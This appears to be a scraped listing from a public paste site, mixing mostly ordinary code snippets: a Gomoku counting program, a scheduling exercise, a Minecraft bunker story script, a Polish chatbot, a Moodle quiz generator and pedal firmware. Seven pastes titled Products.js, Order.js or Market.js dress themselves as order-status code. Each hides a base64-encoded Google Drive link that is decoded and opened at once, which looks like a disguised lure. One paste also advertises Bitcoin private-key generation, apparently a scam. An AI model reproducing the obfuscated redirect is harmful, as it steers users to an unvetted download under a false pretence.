      os.execute(""reboot"")
    elseif key == 51 then -- Кнопка 3 (Закрыть программу)
      os.exit()
    end
  end
end"
tiqLNNMR,五子棋对弈 参考代码,Dmaxiya,C++,Saturday 29th of March 2025 10:00:19 AM CDT,"#include <bits/stdc++.h>
using namespace std;

typedef long long LL;
const int maxn = 100 + 100;
int ans;
int board[maxn][maxn];

bool judge(int x, int y) {
    if (x != 4 && y != 4) {
        return true;
    }

    bool allSame = true;
    if (x == 4) {
        for (int i = 0; i < 5; ++i) {
            if (board[i][y] != board[x][y]) {
                allSame = false;
                break;
            }
        }
        if (allSame) {
            return false;
        }
    }

    allSame = true;
    if (y == 4) {
        for (int i = 0; i < 5; ++i) {
            if (board[x][i] != board[x][y]) {
                allSame = false;
                break;
            }
        }
        if (allSame) {
            return false;
        }
    }

    allSame = true;
    if (x == 4 && y == 0) {
        for (int i = 0; i < 5; ++i) {
            if (board[i][4 - i] != board[4][0]) {
                allSame = false;
                break;
            }
        }
        if (allSame) {
            return false;
        }
    }

    allSame = true;
    if (x == 4 && y == 4) {
        for (int i = 0; i < 5; ++i) {
            if (board[i][i] != board[4][4]) {
                allSame = false;
                break;
            }
        }
        if (allSame) {
            return false;
        }
    }

    return true;
}

void dfs(int depth, int white, int black) {
    if (depth == 25) {
        ++ans;
        return ;
    }
    int x = depth / 5;
    int y = depth % 5;
    if (white > 0) {
        board[x][y] = 0;
        if (judge(x, y)) {
            dfs(depth + 1, white - 1, black);
        }
    }
    if (black > 0) {
        board[x][y] = 1;
        if (judge(x, y)) {
            dfs(depth + 1, white, black - 1);
        }
    }
}

int main() {
#ifdef ExRoc
    freopen(""test.txt"", ""r"", stdin);
#endif // ExRoc
    ios::sync_with_stdio(false);

    dfs(0, 13, 12);
    cout << ans << endl;

    return 0;
}"
GxB1emFR,Products.js,WassupDog45,JavaScript,Saturday 29th of March 2025 09:49:37 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/295/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
H7utwUik,Order.js,WassupDog45,JavaScript,Saturday 29th of March 2025 09:34:13 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/346/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
nshXcAHd,Market.js,WassupDog45,JavaScript,Saturday 29th of March 2025 09:18:50 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/459/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
keV37Ahr,getMaxEarnings,adityasuman100,C++,Saturday 29th of March 2025 09:10:05 AM CDT,"#include <iostream>
#include <vector>
#include <algorithm>

using namespace std;

long getMaxEarnings(string schedule, int k, int fixedPay, int bonus) {
    int n = schedule.size();
    vector<int> zeroIndices;
    
    // Store the indices of '0's
    for (int i = 0; i < n; i++) {
        if (schedule[i] == '0') {
            zeroIndices.push_back(i);
        }
    }
    
    // If k is greater than or equal to the number of '0's, make all '0's '1'
    int zeroCount = zeroIndices.size();
    if (k >= zeroCount) {
        fill(schedule.begin(), schedule.end(), '1');
    } else {
        for (int i = 0; i < k; i++) {
            schedule[zeroIndices[i]] = '1';
        }
    }
    
    // Calculate earnings
    long earnings = 0;
    if (schedule[0] == '1') {
        earnings += fixedPay;
    }
    
    for (int i = 1; i < n; i++) {
        if (schedule[i] == '1') {
            earnings += fixedPay;
            if (schedule[i - 1] == '1') {
                earnings += bonus;
            }
        }
    }
    
    return earnings;
}

int main() {
    cout << getMaxEarnings(""10100"", 2, 1, 2) << endl; // Output: 10
    cout << getMaxEarnings(""100101"", 2, 4, 3) << endl; // Output: 29
    cout << getMaxEarnings(""1111001"", 1, 3, 3) << endl; // Output: 30
    return 0;
}





In a company, an employee receives a fixed amount, fixedPay dollars, each day they work. They also receive a bonus, bonus dollars, on a workday if they worked the day before. The employee is planning their work schedule for n days.

Their schedule is given as a binary string schedule where '1"" is a workday, and 'O"" is not. The employee can change up to k days off ('0) to workdays (*1"").

Find the maximum earnings the employee can get after changing at most k days from 'O' to '1'.

Example n =5

k= 2

fixedPay = 1

bonus = 2

schedule =""10100""

An optimal way to change the schedule is to work on the second and fourth days. In this case, the schedule becomes ""11110"".

﻿﻿On the first day, earnings - fixedPay = 1.

﻿﻿On days 2, 3, and 4, earnings - fixedPay + bonus = 3.

Total earnings = 1 + 3 + 3 + 3 + 0 = 10. Return 10.

Function Description

Complete the function getMaxEarnings in the editor with the following parameters:

string schedule: initial work schedule

int k: the maximum number of extra days the employee can work int fixedPay: the fixed pay for each workday

int bonus: the bonus if they also worked the previous day

Returns

long: the maximum earnings possible

sample 0

schedule = ""100101""

k = 2

fixedPay = 4

bonus = 3

output

29

An optimal schedule is to work on the second and third days too, so the schedule is ""111101"".

﻿﻿On the first day, earnings = fixedPay = 4.

﻿﻿On days 2, 3, and 4, earnings = fixedPay + bonus = 7.

﻿﻿On day 5, earnings - fixedPay = 4.

Total earnings = 4 + 7 + 7 + 7 + 0 + 4 = 29.

sample 1

schedule = ""1111001""

k = 1

fixedPay = 3

bonus = 3

output

30

Explanation

An optimal schedule is to also work on the fifth day, so the schedule is *1111101"".

﻿﻿On the first day, earnings = fixedPay = 3.

﻿﻿On days 2, 3, 4, and 5 earnings - fixedPay + bonus - 6.

﻿﻿On day 6, earnings = fixedPay = 3.

Total earnings = 3 + 6 + 6 + 6 + 6 + 0 + 3 = 30.

solve in c++"
raEvdiTh,Hiddengate Lab/bunker,samuelask,Lua,Saturday 29th of March 2025 09:06:38 AM CDT,"-- Script for Bunker Control
local component = require(""component"")
local thread = require(""thread"")
local event = require(""event"")
local term = require(""term"")
local serialization = require(""serialization"")
local modem = component.modem
local gpu = component.gpu
local debug_card = component.debug
High_Command = """"
Laboratory1 = """"
Laboratory2 = """"
Omega_Site = """"
gate = """"
running = true
decon = false
-- Configuration
beacon = true
modem.open(123)

-- UI Drawing Function
local function draw_ui()
    term.clear()
    print(""Bunker Control"")
	print(""[SPACE] Toggle Emergency Beacon ["" .. (beacon and ""ON"" or ""OFF"") .. ""]"")
    print(""[D] "" .. (decon and ""Run Decontamination Procedure [RUNNING]"" or ""Run Decontamination Procedure""))
    print(""[U] Update orders from high command"")
	print(""[M] Messages"")
    print(""[Q] Dial Omega Site"")
end

-- UI Drawing Function messages
local function draw_ui_messages()
    term.clear()
    print(""Messages"")
	print(""[R] Read messages"")
    print(""[S] Send message"")
    print(""[E] Exit"")
end

-- Function to send commands
local function send_command(address, command, value)
  
  local data = {
	from = ""Bunker 2"",
    message = value,
    timestamp = os.time()
  }
	local serialized_data = serialization.serialize(data)
    modem.send(address, 123, command, serialized_data)
end

-- Function to read messages
local function read_message()
	::continue1::
	term.clear()
	print(""Inbox"")
	print(""Pick a message to read"")
	print(""︱NEWEST︱"")
	print(""[1] ︱ [Omega] ComE ︱"")
    print(""[2] ︱ [ALERT] LOCKDOWN INITIATED ︱"")
    print(""[3] ︱ [Lab 1] Missing Shipment ︱"")
	print(""[4] ︱ [Lab 2] Lab results ︱"")
	print(""[5] ︱ [Omega] Iris installed ︱"")
	print(""[6] ︱ [High cmd] Increased activity READ ME︱"")
	print(""[7] ︱ [Lab 2] Eggsacks ︱"")
	print(""︱OLDEST︱"")
	print(""[E] Exit"")
	local answer = io.read()
	if answer == ""1"" then
		term.clear()
		print(""[E] Exit"")
		print(""︱ [Omega] ComE ︱"")
		print(""Join us, we lvie in hramony, the msnoetrs are gone, we cannot aecscc your wold,"")
		print(""you will cmoe to ouesr, cmoe cmoe, Alvin missse you all"")
		print("""")
		print(""Unknown entity, Omega Site"")

		goto continue1
	elseif answer == ""2"" then
		term.clear()
		print(""[E] Exit"")
		print(""︱ [ALERT] LOCKDOWN INITIATED ︱"")
		print(""THIS IS NOT A DRILL, THIS IS NOT A DRILL, THIS IS NOT A DRILL"")
		print(""ALL SITES, COMMENCE Decontamination Procedure, COMMENCE LOCKDOWN."")
		print(""READ REST OF MESSAGE WHEN COMPLETE!"")
		print("""")
		print(""Omega site is unavailable, no one is answering. Lab 2 is the same."")
		print(""Alpha site received a wormhole from Omega site but no one got through!."")
		print(""We cannot reach them since High Command is also unavailable."")
		print(""I have ordered an ALERT on all channels as proper procedure."")
		print(""PLEASE RESPOND IF YOU ARE READING THIS!."")
		print(""We also have a power problem at Alpha site, today we were supposed to receive a new ZPM."")
		print(""At limited usage we should be good for another month, but after that we need to evacuate."")
		print(""Since High Command is not available we cannot use our stargate, the Iris code is encrypted."")
		print(""RESPOND IMMEDIATELY if receiving this message!."")
		print("""")
		print(""Rosewood, Head of Security, Alpha Site"")
		
		local answer = io.read()
		goto continue1
	elseif answer == ""3"" then
		term.clear()
		print(""[E] Exit"")
		print(""︱ [Lab 1] Missing Shipment ︱"")
		print(""Im reaching you since i cant get a hold of Lab 2 myself, my security clearence isnt that high."")
		print(""We were supposed to receive a shipment today but it never came. It was supposed to be delivered through the gate."")
		print(""It does not say what it even is, so you can imagine my frustration."")
		print(""Let me know if you find it, i will report this incident to my higher ups, you should report it to High Command."")
		print("""")
		print(""Jack, Shipment officer, Lab 1"")
		local answer = io.read()
		goto continue1
	elseif answer == ""4"" then
		term.clear()
		print(""[E] Exit"")
		print(""︱ [Lab 2] Lab results ︱"")
		print(""We have dubbed it """"Alvin"""", from alvin and the chipmunks!"")
		print(""Alvin has exceeded our expectations, he (or it rather) is a perfect creature. Able to adapt and reform his body at will."")
		print(""We have feeded it live chipmunks and it immediately assumed its form as one! Before devouring them."")
		print(""It has now grown, its the size of a human. Although i doubt it has the intelligence of one."")
		print(""It also has this weird effect on life around it, it kinda dies, and reanimates into something different."")
		print(""We had to increase the security zone around its holding area, my plants were dying because of it."")
		print(""We will need to move it in the near future, to a more secure facility."")
		print(""I hear Lab 1 is getting a 20 billion dollar funding this year, lucky them."")
		print(""Let High Command know i will be terminating the rest of the eggs also, they have begun to smell."")
		print(""Oh and that Lab 1 can take care of """"Alvin""""."")
		print("""")
		print(""Doctor Greywall, Lab 2"")
		
		local answer = io.read()
		goto continue1
	elseif answer == ""5"" then
		term.clear()
		print(""[E] Exit"")
		print(""︱ [Omega] Iris installed ︱"")
		print(""As per requested the Iris is now operational, although we are abit sceptical that the code is classified."")
		print(""What if the settlers have family to visit?"")
		print(""Also it will become harder to receive supply, High command needs to approve everytime so they can shutdown the Iris!"")
		print(""Please forward these issues to High Command, its important for us."")
		print(""We have also been seeing thing here, things in the dark. Im not the only one."")
		print(""David saw a GIANT spider yesterday, looked like it could eat a cat!."")
		print("""")
		print(""Bryan Haddoc, Omega Site"")	
		local answer = io.read()
		goto continue1
	elseif answer == ""6"" then
		term.clear()
		print(""[E] Exit"")
		print(""︱ [High cmd] Increased activity READ ME︱"")
		print(""High Command has finished its assessment around the Omega site, new security measures are to be taken."")
		print(""The local fauna has been increasing its hostility towards the site, where as before it was only curious of us, it is now our belief it has grown more hostile."")
		print(""No doubt due to the experiments from Doctor Greywall in Lab 2."")
		print(""An Iris to the gate at Omega site is to be installed at once! New intel suggests that there is currently a large scale operation"")
		print(""underway intended to sabotage the site, possibly even a takeover. Secure the gate, then take care of the wildlife surrounding the Omega site."")
		print(""We dont want any surprises. Make sure that the Iris gate code is ONLY known by High Command."")
		print("""")
		print(""The settlements beyond Omega is also now at greater risk."")
		print(""Until we have a greater understanding of the local fauna, NO personnel is allowed to leave the Omega site."")
		print(""The settlers can protect themselves, they are all armed after all."")
		print("""")
		print(""Secretary General Coldwell, HC"")		
		local answer = io.read()
		goto continue1
	elseif answer == ""7"" then
		term.clear()
		print(""[E] Exit"")
		print(""︱ [Lab 2] Eggsacks ︱"")
		print(""The eggsacks found on the planet nibiru have produced results."")
		print(""We have managed to create a hybrid of a vein floater along with local fauna found on the Omega site."")
		print(""So far it has adapted to everything we have thrown at it,"")
		print(""Lava, shotguns, electrocutions, it seems to handle it all."")
		print(""The staff is beginning to wonder what we should do if it breaks out."")
		print(""Not to worry, the lab is set to blow with a 100 Megaton warhead if it does, but i wont tell them that."")
		print(""Also it has begun laying eggs on its own, expect more results sooner now rather than later."")
		print("""")
		print(""Doctor Greywall, Lab 2"")		
		local answer = io.read()
		goto continue1
	elseif answer == ""e"" or answer == ""E"" then
	
	else 
		goto continue1
	end
end

-- Function to send messages
local function send_message()
	::continue1::
	term.clear()
	print(""Pick receiver"")
	print(""[1] High Command"")
    print(""[2] Laboratory 1"")
	print(""[3] Laboratory 2"")
    print(""[4] Omega Site"")
	print(""[E] Exit"")
	local answer = io.read()
	if answer == ""1"" then
		send_to = High_Command
		print(""High Command Confirmed, please begin typing your message, when done press enter"")
		print("""")
		local message = io.read()
		send_command(send_to, ""message"", message)
		term.clear()
		print(""Message sent to High Command"")
		os.sleep(3)
		goto continue1
	elseif answer == ""2"" then
		send_to = Laboratory1
		print(""Laboratory 1 Confirmed, please begin typing your message, when done press enter"")
		print("""")	
		local message = io.read()		
		send_command(send_to, ""message"", message)
		term.clear()
		print(""Message sent to Laboratory"")
		os.sleep(3)
		goto continue1
	elseif answer == ""3"" then
		send_to = Laboratory2
		print(""Laboratory 2 Confirmed, please begin typing your message, when done press enter"")
		print("""")
		local message = io.read()
		send_command(send_to, ""message"", message)
		term.clear()
		print(""Message sent to Omega Site"")
		os.sleep(3)
		goto continue1
	elseif answer == ""4"" then
		send_to = Omega_Site
		print(""Omega Site Confirmed, please begin typing your message, when done press enter"")
		print("""")
		local message = io.read()
		send_command(send_to, ""message"", message)
		term.clear()
		print(""Message sent to Omega Site"")
		os.sleep(3)
		goto continue1
	elseif answer == ""e"" or answer == ""E"" then
	
	else 
		goto continue1
	end
end

-- Keyboard Input Listener
local function key_listener(_, _, char, code, _)
    local key = string.char(char)
	event.ignore(""key_down"", key_listener)
    if key == ""u"" then
			term.clear()
			print(""Connecting to central network..."")
			os.sleep(3)
			print(""[ERROR] No connection"")
			os.sleep(0.5)
			print(""[ERROR] Diagnosing..."")
			os.sleep(3)
			print(""[ERROR] Receiver [OFFLINE]"")
			print(""[✔] Transmitter [ONLINE]"")
			print(""[⚠] Can not receive orders/messages"")
			print(""[⚠] ONLY Transmit!"")
			print("""")
			print(""Please follow standard Emergency Procedures"")
			os.sleep(8)
			draw_ui()
    elseif key == ""d"" then
			if decon then
				print(""Cannot stop Decontamination Procedure"")
			elseif not decon then
				decon = not decon
				draw_ui()
				debug_card.runCommand(""/effect @e[x=15019,y=40,z=12603,dx=57,dy=13,dz=57] minecraft:poison 10 3"")
				os.sleep(10)
				decon = not decon
				draw_ui()
				print(""Decontamination Procedure Complete!"")
			end
    elseif key == ""q"" then
			send_command(gate, ""dialOmega"", """")
			print(""Dialing Omega Site!"")
    elseif code == 57 then
		if beacon then
			print(""Confirm Beacon Shutdown"")
			print(""Y/n"")
			local answer = io.read()
			if answer == ""y"" or answer == ""Y"" then
				beacon = not beacon
				print(""Confirmed"")
				os.sleep(3)
				draw_ui()
			else
				print(""Aborted!"")
				os.sleep(3)
				draw_ui()
			end
		elseif not beacon then
			beacon = not beacon
			draw_ui()
			print(""Emergency Beacon Online!"")
			
		end
	elseif key == ""m"" then
		::continue::
		draw_ui_messages()
		local answer = io.read()
		if answer == ""r"" or answer == ""R"" then
			read_message()
			goto continue
		elseif answer == ""s"" or answer == ""S"" then
			send_message()
			goto continue
		elseif answer == ""e"" or answer == ""E"" then
			draw_ui()
		else
			goto continue
		end
    end
	event.listen(""key_down"", key_listener)
end
draw_ui()
event.listen(""key_down"", key_listener)

while running do
	os.sleep(0.5)
end

os.sleep(1)
os.exit()"
fAc2SnN5,Untitled,WassupDog45,JavaScript,Saturday 29th of March 2025 09:03:27 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/112/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
aii9GFjp,ChatBot,Cassimus,C#,Saturday 29th of March 2025 08:53:55 AM CDT,"

public class ChatBot
{
    static string[] odpowiedzi = {
        ""Żegnaj wędrowcze, mam nadzieję że pomoglem"", //0
        ""Żeby utworzyć Gildie musisz zebrać trzech czlonkow i wpłacić 500 monet do mnie, w celu rejestracji"",
        ""Mam na sprzedaż eliksiry, zbroje i bronie ( w tym magiczne), o surowce musisz się sam postarać"" +
        ""Mogę od ciebie odkupić złom. Nie widze nic wartościowego w twoim ekwipunku"" //3
    };

    static string[][] pytania =  {
        [""żegna"", ""bye"", ""koniec"", ""do zobaczenia"", ""cu"", ""nara""],
        [""twórz"", ""tworz"", ""załóż"", ""założ"", ""zakład"", ""gildi""],
        [""sprzeda"", ""handel"", ""kupno"", ""wymiana"", ""wymie""]
    };



    public static void Main(string[] args)
    {
        bool czyUruchominoRozmowe = true;
        // Lider Frakcji : 
        // Utworzenie Gildii
        //Sprzedaż i kupno itemów
        System.Console.WriteLine(""Lider Frakcji: Witaj podróżny. Co moge dla ciebie zrobić?"");

        while (czyUruchominoRozmowe)
        {
            //Pytanie 
            Console.Write(""Ty: "");
            string wprowadzonyTekst = Console.ReadLine().ToLower();

            //Odpowiedź
            // -1 -brak dopasowania, 0 - koniec rozmowy , >0 - komputer zna i pobiera odp.
            int klucz = ZnajdzKlucz(wprowadzonyTekst);

            if(klucz < 0 )
            {
                System.Console.WriteLine(""Lider Frakcji: Nie do końca rozumiem o co Ci chodzi"");
            }
            else if (klucz == 0)
            {
                czyUruchominoRozmowe = false;
                WyswielanieOdpowiedzi(klucz);
            }
            else
            {
                WyswielanieOdpowiedzi(klucz);
            }

        }
    }

    private static void WyswielanieOdpowiedzi(int klucz)
    {
        System.Console.WriteLine(""Lider Frakcji: ""+ odpowiedzi[klucz]);
    }

    private static int ZnajdzKlucz(string wprowadzonyTekst)
    {
        for (int i = 0; i<pytania.Length; i++)
        {
            foreach(var slowo in pytania[i])
            {
                if(wprowadzonyTekst.Contains(slowo))
                {
                    return i;
                }
            }
        }
        return -1;
    }
}"
cfDWVEhF,Products.js,WassupDog45,JavaScript,Saturday 29th of March 2025 08:48:05 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/331/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
WUuAeQwq,m,mayankjoin3,Python,Saturday 29th of March 2025 08:33:37 AM CDT,"#mcq will be mapped. 1...25, their value will be A,B,C,D
ans = {1 : 'A', 2 : 'B', 3 : 'D', 4 : 'B'}

start=49284
for i in range(1,25):
    print(f""""""<!-- question: {start}  -->
    <question type=""multichoice"">
        <name>
        <text>Q{i:02}</text>
        </name>
        <questiontext format=""html"">
        <text><![CDATA[<p><img src=""@@PLUGINFILE@@/file.png""></p>]]></text>
        </questiontext>
        <generalfeedback format=""html"">
        <text></text>
        </generalfeedback>
        <defaultgrade>1.0000000</defaultgrade>
        <penalty>0</penalty>
        <hidden>0</hidden>
        <idnumber></idnumber>
        <single>true</single>
        <shuffleanswers>false</shuffleanswers>
        <answernumbering>abc</answernumbering>
        <showstandardinstruction>0</showstandardinstruction>
        <correctfeedback format=""html"">
        <text></text>
        </correctfeedback>
        <partiallycorrectfeedback format=""html"">
        <text></text>
        </partiallycorrectfeedback>
        <incorrectfeedback format=""html"">
        <text></text>
        </incorrectfeedback>
        <answer fraction=""100"" format=""html"">
        <text><![CDATA[<p>Option A</p>]]></text>
        <feedback format=""html"">
            <text></text>
        </feedback>
        </answer>
        <answer fraction=""0"" format=""html"">
        <text><![CDATA[<p>Option B</p>]]></text>
        <feedback format=""html"">
            <text></text>
        </feedback>
        </answer>
        <answer fraction=""0"" format=""html"">
        <text><![CDATA[<p>Option C</p>]]></text>
        <feedback format=""html"">
            <text></text>
        </feedback>
        </answer>
        <answer fraction=""0"" format=""html"">
        <text><![CDATA[<p>Option D</p>]]></text>
        <feedback format=""html"">
            <text></text>
        </feedback>
        </answer>
    </question>"""""")
    start+=1"
ESEpdgcH,Order.js,WassupDog45,JavaScript,Saturday 29th of March 2025 08:32:42 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/981/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
LcciuGRp,Generate,Nil000,Email,Saturday 29th of March 2025 08:25:42 AM CDT,"Mass Bitcoin address (with private key) generation!
Email me at: bitcryptomann@gmail.com"
93EK5aV4,Market.js,WassupDog45,JavaScript,Saturday 29th of March 2025 08:17:20 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/333/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
5vLkKvA6,V2 W/Calibration,LandoRo,C++,Saturday 29th of March 2025 08:14:47 AM CDT,"#include <Wire.h>
#include <Adafruit_ADS1X15.h>
#include <Adafruit_SSD1306.h>
#include <BleGamepad.h>
#include <Adafruit_TinyUSB.h>
#include ""tusb.h""
#include <EEPROM.h>

// PROGMEM strings
const char gasStr[] PROGMEM = ""Gas"";
const char brakeStr[] PROGMEM = ""Brake"";
const char clutchStr[] PROGMEM = ""Clutch"";
const char* const pedalNames[] PROGMEM = {gasStr, brakeStr, clutchStr};
const char simPedalsStr[] PROGMEM = ""Sim Pedals"";
const char adcErrorStr[] PROGMEM = ""ADC Error"";
const char pressPedalStr[] PROGMEM = ""Press pedal fully"";
const char releasePedalStr[] PROGMEM = ""Release pedal"";
const char resetToDefaultsStr[] PROGMEM = ""to Defaults"";

// OLED Config
#define SCREEN_WIDTH 128
#define SCREEN_HEIGHT 64
#define OLED_RESET -1
Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);

// ADS1115 Instance
Adafruit_ADS1115 ads;

// BLE Gamepad Instance
BleGamepad bleGamepad(""Generic Sim Pedals BLE"", ""xAI"", 100);

// USB HID Instance
Adafruit_USBD_HID usb_hid;

// HID Report Descriptor (3-axis joystick)
static const uint8_t hid_report_descriptor[] = {0x05, 0x01, 0x09, 0x05, 0xA1, 0x01, 0x85, 0x01, 0x09, 0x30, 0x09, 0x31, 0x09, 0x32, 0x15, 0x00, 0x26, 0xFF, 0x7F, 0x75, 0x10, 0x95, 0x03, 0x81, 0x02, 0xC0};

// Pins
#define SDA_PIN 9
#define SCL_PIN 10
#define GAS_BUTTON_PIN 2
#define BRAKE_BUTTON_PIN 3
#define CLUTCH_BUTTON_PIN 4

// Constants
const uint16_t DEFAULT_MIN_VOLT = 500;  // mV
const uint16_t DEFAULT_MAX_VOLT = 4500; // mV
const uint8_t DEAD_ZONE_PCT = 5;        // 5%
const uint16_t CALIBRATION_TICKS = 1000;// 10s @ 10ms/tick
const uint16_t RESET_TICKS = 500;       // 5s @ 10ms/tick
const uint16_t DEBOUNCE_TICKS = 50;     // 0.5s @ 10ms/tick

enum PedalType { PEDAL_GAS = 0, PEDAL_BRAKE = 1, PEDAL_CLUTCH = 2, NUM_PEDALS = 3 };
enum State { NORMAL, CALIBRATING, RESETTING };

// Calibration Values (in mV)
uint16_t minVolts[NUM_PEDALS] = {DEFAULT_MIN_VOLT, DEFAULT_MIN_VOLT, DEFAULT_MIN_VOLT};
